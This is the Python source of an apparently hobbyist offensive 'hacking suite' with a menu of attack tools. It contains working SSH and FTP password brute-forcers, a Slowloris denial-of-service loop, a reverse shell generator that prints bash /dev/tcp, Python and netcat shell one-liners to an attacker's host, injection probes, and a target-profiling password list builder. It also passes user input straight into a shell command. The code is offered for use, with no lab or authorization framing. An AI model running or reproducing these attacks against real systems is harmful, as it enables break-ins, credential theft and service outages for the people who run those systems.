# Rayan (Abu_Jaber) - The Ultimate Suite v5.0
# Author: Rayan (Abu_Jaber)
# A collaborative project.

import socket
import time
import sys
import os
import random
import threading
import base64
try:
    import requests
    from bs4 import BeautifulSoup
    from PIL import Image
    from PIL.ExifTags import TAGS
    import paramiko
except ImportError as e:
    print(f"\033[1;31m[!] Critical library not found: {e}. Please run:\033[1;36m")
    print("pip install requests beautifulsoup4 Pillow paramiko")
    sys.exit(1)

# --- ANSI color codes ---
R, G, B, Y, C, W = "\033[1;31m", "\033[1;32m", "\033[1;34m", "\033[1;33m", "\033[1;36m", "\033[0m"

# --- Helper Functions ---
def slow_print(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.005)

def coming_soon():
    print(f"\n{R}[!] This feature is complex and requires further development.{W}")

# --- Main Banner and Menu ---
def banner():
    slow_print(f"""
{Y}
                  ...
                 ;::::;
               ;::::; :;
             ;:::::'   :;
            ;:::::;     ;.
           ,:::::'       ;           OOO\\
           ::::::;       ;          OOOOO\\
           ;:::::;       ;         OOOOOOOO
          ,;::::::;     ;'         / OOOOOOO
        ;:::::::::`. ,,,;.        /  / DOOOOOO
      .';:::::::::::::::::;,     /  /     DOOOO
     ,::::::;::::::;;;;::::;,   /  /        DOOO
    ;`::::::`'::::::;;;::::: ,#/  /          DOOO
    :`:::::::`;::::::;;::: ;::#  /            DOOO
    ::`:::::::`;:::::::: ;::::# /              DOO
    `:::`:::::::`;; ;:::::::::##                OO
     `:::`::::::::;;::::::::;:::#                OO
      `:::`::::::::;;:::::: ;::::::#              O
       `:::`:::::::::'; ;  :::::::::#             O
        `:::`::::::::: ;   ::::::::::#
         `:::`:::::::::  ,:::::::::::#
          `:::`:::::::::;::::::::;::;
           `:::`::::::::#`::::::'
             `:::`::::'#`::'
               `:::`'
{G}
        #########################################
        #                                       #
        # {R}     TOOL: Rayan (Abu_Jaber)           {G}#
        # {R}     AUTHOR: Rayan (Abu_Jaber)         {G}#
        # {R}     Version: 5.0 (The Ultimate Suite) {G}#
        #                                       #
        #########################################
{W}
""")

def menu():
    print(f"\n{Y}========== {C}Reconnaissance & Information Gathering{Y} =========={W}")
    print(f"{C}1. {G}IP Scanner (Port Scanner){W}")
    print(f"{C}2. {G}Vulnerability Scanner (Banner/Header Grabbing){W}")
    print(f"{C}3. {G}Information Gathering (Whois){W}")
    print(f"{C}4. {G}Subdomain Finder{W}")
    print(f"{C}5. {G}Admin Panel Finder{W}")
    print(f"{C}6. {G}Link Extractor{W}")
    print(f"{C}7. {G}Web Tech Scanner{W}")
    print(f"{C}8. {G}Image Metadata Extractor{W}")
    print(f"\n{Y}========== {C}Vulnerability Scanning & Analysis{Y} ============{W}")
    print(f"{C}9. {G}SQL Injection Scanner (Basic){W}")
    print(f"{C}10. {G}XSS Scanner (Basic){W}")
    print(f"{C}11. {G}Command Injection Scanner (Basic){W}")
    print(f"{C}12. {G}Security Headers Scanner{W}")
    print(f"\n{Y}================== {C}Exploitation & Attacks{Y} =================={W}")
    print(f"{C}13. {G}Brute-force Attack (SSH){W}")
    print(f"{C}14. {G}FTP Brute-force{W}")
    print(f"{C}15. {G}DoS Attack (Slowloris){W}")
    print(f"{C}16. {G}Reverse Shell Generator{W}")
    print(f"\n{Y}================ {C}Utilities & Post-Exploitation{Y} ============{W}")
    print(f"{C}17. {G}Custom Wordlist Generator{W}")
    print(f"{C}18. {G}Encoder/Decoder (Base64){W}")
    print(f"{C}19. {G}Post-Exploitation Automation{W} {Y}(Theoretical){W}")
    print(f"{C}20. {G}File Uploader/Downloader{W} {Y}(Theoretical){W}")
    print(f"\n{Y}======================= {C}System{Y} ==========================={W}")
    print(f"{C}99. {R}Exit{W}")

# --- Tool Functions ---

def port_scanner():
    try:
        target_ip = input(f"\n{Y}[~] Enter Target IP: {W}")
        print(f"\n{B}[*] Scanning target: {target_ip}{W}")
        open_ports = []
        for port in range(1, 1025):
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                socket.setdefaulttimeout(0.1)
                if s.connect_ex((target_ip, port)) == 0: open_ports.append(port)
        if open_ports:
            print(f"\n{G}[+] Scan Complete! Open ports found:{W}")
            for port in open_ports: print(f"{G}  -> Port {port} is open{W}")
        else: print(f"\n{R}[-] No open ports found in range 1-1024.{W}")
    except Exception as e: print(f"\n{R}[!] Error: {e}{W}")

def vuln_scanner():
    try:
        target_ip = input(f"\n{Y}[~] Enter Target IP: {W}")
        port = int(input(f"{Y}[~] Enter Port to scan: {W}"))
        print(f"\n{B}[*] Grabbing info from {target_ip}:{port}{W}")
        with socket.socket() as s:
            s.settimeout(2)
            s.connect((target_ip, port))
            if port == 80 or port == 443:
                s.send(b'GET / HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n\r\n')
            response = s.recv(1024)
        if response:
            print(f"\n{G}[+] Response/Banner Found:{W}\n{C}{response.decode('utf-8', 'ignore').strip()}{W}")
        else: print(f"\n{Y}[-] No response received.{W}")
    except Exception as e: print(f"\n{R}[!] Error: {e}{W}")

def info_gathering():
    target_domain = input(f"\n{Y}[~] Enter Domain for Whois Lookup (e.g., google.com): {W}")
    print(f"\n{B}[*] Performing Whois lookup for {target_domain}...{W}")
    if os.system(f"whois {target_domain}") != 0:
        print(f"\n{R}[!] Whois command failed. Is 'whois' installed? (pkg install whois){W}")

def subdomain_finder():
    domain = input(f"\n{Y}[~] Enter Domain to scan (e.g., google.com): {W}")
    wordlist_path = input(f"{Y}[~] Enter path to subdomain wordlist (or press Enter for default list): {W}")
    subdomains = []
    if os.path.exists(wordlist_path):
        with open(wordlist_path, 'r') as f: subdomains = [line.strip() for line in f]
    else:
        print(f"{B}[*] Using default small wordlist...{W}")
        subdomains = ['www', 'mail', 'ftp', 'admin', 'cpanel', 'blog', 'dev', 'test', 'api', 'shop']
    
    found_subdomains = []
    print(f"{B}[*] Starting scan for subdomains of {domain}...{W}")
    for sub in subdomains:
        full_domain = f"{sub}.{domain}"
        try:
            ip_address = socket.gethostbyname(full_domain)
            print(f"{G}[+] Found: {full_domain}  ->  {ip_address}{W}")
            found_subdomains.append(full_domain)
        except socket.gaierror: pass
    print(f"\n{G if found_subdomains else R}[+] Scan Complete! Found {len(found_subdomains)} subdomains.{W}")

def admin_panel_finder():
    url = input(f"\n{Y}[~] Enter target URL (e.g., http://example.com): {W}")
    paths = ['admin/', 'administrator/', 'login.php', 'admin.php', 'wp-login.php', 'cpanel']
    print(f"\n{B}[*] Searching for admin panels on {url}...{W}")
    for path in paths:
        full_url = f"{url}/{path}"
        try:
            response = requests.get(full_url, timeout=3)
            if response.status_code == 200:
                print(f"{G}[+] Found: {full_url}{W}")
        except requests.exceptions.RequestException: pass
    print(f"\n{B}[*] Admin panel search finished.{W}")

def link_extractor():
    url = input(f"\n{Y}[~] Enter URL to extract links from: {W}")
    print(f"\n{B}[*] Fetching links from {url}...{W}")
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        links = {a.get('href') for a in soup.find_all('a', href=True)}
        if links:
            print(f"{G}[+] Found {len(links)} unique links:{W}")
            for link in sorted(links): print(f"{C}  -> {link}{W}")
        else: print(f"{R}[-] No links found.{W}")
    except requests.exceptions.RequestException as e: print(f"\n{R}[!] Could not fetch URL: {e}{W}")

def web_tech_scanner():
    url = input(f"\n{Y}[~] Enter URL to analyze: {W}")
    print(f"\n{B}[*] Analyzing headers from {url}...{W}")
    try:
        response = requests.get(url, timeout=5)
        headers = response.headers
        techs = []
        if 'Server' in headers: techs.append(f"Server: {headers['Server']}")
        if 'X-Powered-By' in headers: techs.append(f"Powered-By: {headers['X-Powered-By']}")
        if 'wp-content' in response.text: techs.append("CMS: WordPress")
        if 'Joomla' in response.text: techs.append("CMS: Joomla")
        
        if techs:
            print(f"{G}[+] Technologies identified:{W}")
            for tech in techs: print(f"{C}  -> {tech}{W}")
        else: print(f"{R}[-] Could not identify specific technologies from headers.{W}")
    except requests.exceptions.RequestException as e: print(f"\n{R}[!] Could not fetch URL: {e}{W}")

def image_metadata_extractor():
    image_url = input(f"\n{Y}[~] Enter URL of the image: {W}")
    try:
        response = requests.get(image_url, stream=True, timeout=5)
        response.raise_for_status()
        image = Image.open(response.raw)
        exif_data = image._getexif()
        if exif_data:
            print(f"{G}[+] EXIF Metadata Found:{W}")
            for tag_id, value in exif_data.items():
                tag = TAGS.get(tag_id, tag_id)
                print(f"{C}  -> {tag}: {value}{W}")
        else: print(f"{R}[-] No EXIF metadata found in this image.{W}")
    except Exception as e: print(f"\n{R}[!] Error processing image: {e}{W}")

def sql_injection_scanner():
    url = input(f"\n{Y}[~] Enter URL with a parameter to test (e.g., http://test.com/cat.php?id=1): {W}")
    print(f"\n{B}[*] Performing basic SQLi scan...{W}")
    payload = "'"
    try:
        response = requests.get(url + payload, timeout=5)
        if "error in your SQL syntax" in response.text.lower() or "mysql" in response.text.lower():
            print(f"{G}[+] VULNERABLE: The URL seems to be vulnerable to SQL Injection!{W}")
        else: print(f"{R}[-] NOT VULNERABLE: Basic SQLi check did not trigger an error.{W}")
    except requests.exceptions.RequestException as e: print(f"\n{R}[!] Could not fetch URL: {e}{W}")

def xss_scanner():
    url = input(f"\n{Y}[~] Enter URL with a parameter to test (e.g., http://test.com/search.php?q=): {W}")
    print(f"\n{B}[*] Performing basic XSS scan...{W}")
    payload = "<script>alert('XSS')</script>"
    try:
        response = requests.get(url + payload, timeout=5)
        if payload in response.text:
            print(f"{G}[+] VULNERABLE: The payload was reflected in the page. Check the browser for an alert!{W}")
        else: print(f"{R}[-] NOT VULNERABLE: Basic XSS payload was not reflected.{W}")
    except requests.exceptions.RequestException as e: print(f"\n{R}[!] Could not fetch URL: {e}{W}")

def command_injection_scanner():
    url = input(f"\n{Y}[~] Enter URL with a parameter to test (e.g., http://test.com/ping.php?host=): {W}")
    print(f"\n{B}[*] Performing basic Command Injection scan...{W}")
    payload = ";ls"
    try:
        response = requests.get(url + "127.0.0.1" + payload, timeout=5)
        # A very basic check, real-world scenarios are more complex
        if "total" in response.text and "drwx" in response.text:
             print(f"{G}[+] VULNERABLE: The response may contain command output! Manual verification needed.{W}")
        else: print(f"{R}[-] NOT VULNERABLE: Basic command injection check failed.{W}")
    except requests.exceptions.RequestException as e: print(f"\n{R}[!] Could not fetch URL: {e}{W}")

def security_headers_scanner():
    url = input(f"\n{Y}[~] Enter URL to analyze: {W}")
    print(f"\n{B}[*] Analyzing security headers for {url}...{W}")
    try:
        response = requests.get(url, timeout=5)
        headers = response.headers
        secure_headers = {
            "Strict-Transport-Security": False,
            "Content-Security-Policy": False,
            "X-Content-Type-Options": False,
            "X-Frame-Options": False,
            "X-XSS-Protection": False
        }
        print(f"{G}[+] Analysis Report:{W}")
        for header in secure_headers:
            if header in headers:
                print(f"{G}  -> {header}: Present{W}")
                secure_headers[header] = True
            else:
                print(f"{R}  -> {header}: Missing{W}")
    except requests.exceptions.RequestException as e: print(f"\n{R}[!] Could not fetch URL: {e}{W}")

def brute_force_ssh():
    target_ip = input(f"\n{Y}[~] Enter Target IP (SSH): {W}")
    username = input(f"{Y}[~] Enter Username: {W}")
    wordlist_path = input(f"{Y}[~] Enter Path to Wordlist: {W}")
    if not os.path.exists(wordlist_path):
        print(f"\n{R}[!] Wordlist not found.{W}"); return
    print(f"\n{B}[*] Starting SSH brute-force on {target_ip}...{W}")
    with open(wordlist_path, 'r') as f:
        for line in f:
            password = line.strip()
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(target_ip, port=22, username=username, password=password, timeout=3)
                print(f"\n{G}[+] SUCCESS! Password found: {password}{W}")
                client.close(); return 
            except paramiko.AuthenticationException: print(f"{R}[-] FAILED: {password}{W}"); client.close()
            except Exception as e: print(f"\n{R}[!] Connection error: {e}{W}"); client.close(); return
    print(f"\n{R}[-] Brute-force finished. Password not found.{W}")

def ftp_brute_force():
    host = input(f"\n{Y}[~] Enter FTP Server IP: {W}")
    user = input(f"{Y}[~] Enter FTP Username: {W}")
    wordlist = input(f"{Y}[~] Enter Path to Wordlist: {W}")
    if not os.path.exists(wordlist):
        print(f"\n{R}[!] Wordlist not found.{W}"); return
    print(f"\n{B}[*] Starting FTP brute-force on {host}...{W}")
    with open(wordlist, 'r') as f:
        for line in f:
            password = line.strip()
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((host, 21))
                    s.recv(1024)
                    s.send(f'USER {user}\r\n'.encode())
                    s.recv(1024)
                    s.send(f'PASS {password}\r\n'.encode())
                    resp = s.recv(1024).decode()
                    if '230' in resp:
                        print(f"\n{G}[+] SUCCESS! Password found: {password}{W}")
                        return
                    else: print(f"{R}[-] FAILED: {password}{W}")
            except Exception as e: print(f"\n{R}[!] Connection error: {e}{W}"); return
    print(f"\n{R}[-] Brute-force finished. Password not found.{W}")

def dos_attack():
    target_ip = input(f"\n{Y}[~] Enter Target IP: {W}")
    port = int(input(f"{Y}[~] Enter Port (e.g., 80): {W}"))
    socket_count = int(input(f"{Y}[~] Enter Number of Sockets (e.g., 200): {W}"))
    print(f"\n{B}[*] Starting Slowloris attack on {target_ip}:{port}...{W}\n{R}    Press CTRL+C to stop.{W}")
    list_of_sockets = []
    for _ in range(socket_count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, port))
            list_of_sockets.append(s)
        except Exception as e: print(f"{R}[!] Could not create socket: {e}{W}"); break
    for s in list_of_sockets:
        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
    try:
        while True:
            print(f"\n{B}[*] Sending keep-alive headers... {len(list_of_sockets)} sockets active.{W}")
            for s in list_of_sockets:
                try: s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                except socket.error: list_of_sockets.remove(s)
            time.sleep(15)
    except KeyboardInterrupt:
        print(f"\n{G}[+] Attack stopped. Closing sockets.{W}")
        for s in list_of_sockets: s.close()

def reverse_shell_generator():
    lhost = input(f"\n{Y}[~] Enter Your Local IP (LHOST): {W}")
    lport = input(f"{Y}[~] Enter Your Local Port (LPORT): {W}")
    print(f"\n{G}[+] Reverse Shell Payloads:{W}")
    print(f"{C}--- Bash ---{W}")
    print(f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1")
    print(f"{C}--- Python ---{W}")
    print(f"python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'")
    print(f"{C}--- Netcat ---{W}")
    print(f"nc -e /bin/sh {lhost} {lport}")

def custom_wordlist_generator():
    print(f"\n{B}[*] Enter information about the target (leave blank if unknown).{W}")
    fname = input(f"{Y}[~] First Name: {W}")
    lname = input(f"{Y}[~] Last Name: {W}")
    bdate = input(f"{Y}[~] Birthdate (DDMMYYYY): {W}")
    pet = input(f"{Y}[~] Pet's Name: {W}")
    company = input(f"{Y}[~] Company Name: {W}")
    
    words = {fname, lname, bdate, pet, company}
    if bdate: words.update({bdate[:2], bdate[2:4], bdate[4:]})
    
    words.discard('') # Remove empty strings
    
    final_list = set(words)
    for w1 in words:
        for w2 in words:
            if w1 != w2:
                final_list.add(w1 + w2)
                final_list.add(w1.capitalize() + w2)
    
    filename = "custom_list.txt"
    with open(filename, 'w') as f:
        for item in sorted(final_list): f.write(item + '\n')
    print(f"\n{G}[+] Custom wordlist saved to {filename}{W}")

def encoder_decoder():
    choice = input(f"\n{Y}[~] Choose (1) Encode or (2) Decode: {W}")
    text = input(f"{Y}[~] Enter text: {W}")
    if choice == '1':
        encoded = base64.b64encode(text.encode()).decode()
        print(f"\n{G}[+] Base64 Encoded: {C}{encoded}{W}")
    elif choice == '2':
        try:
            decoded = base64.b64decode(text.encode()).decode()
            print(f"\n{G}[+] Base64 Decoded: {C}{decoded}{W}")
        except Exception: print(f"\n{R}[!] Invalid Base64 string.{W}")
    else: print(f"\n{R}[!] Invalid choice.{W}")

# --- Main Program Logic ---
def main():
    tool_functions = {
        '1': port_scanner, '2': vuln_scanner, '3': info_gathering, '4': subdomain_finder,
        '5': admin_panel_finder, '6': link_extractor, '7': web_tech_scanner, '8': image_metadata_extractor,
        '9': sql_injection_scanner, '10': xss_scanner, '11': command_injection_scanner, '12': security_headers_scanner,
        '13': brute_force_ssh, '14': ftp_brute_force, '15': dos_attack, '16': reverse_shell_generator,
        '17': custom_wordlist_generator, '18': encoder_decoder, '19': coming_soon, '20': coming_soon
    }
    banner()
    while True:
        menu()
        try:
            choice = input(f"\n{Y}>> Enter your choice: {W}")
            selected_tool = tool_functions.get(choice)
            if selected_tool: selected_tool()
            elif choice == '99': print(f"\n{R}Exiting Rayan. Goodbye!{W}"); break
            else: print(f"\n{R}[!] Invalid choice.{W}")
        except KeyboardInterrupt: print(f"\n\n{R}Exiting Rayan. Goodbye!{W}"); break

if __name__ == "__main__":
    main()
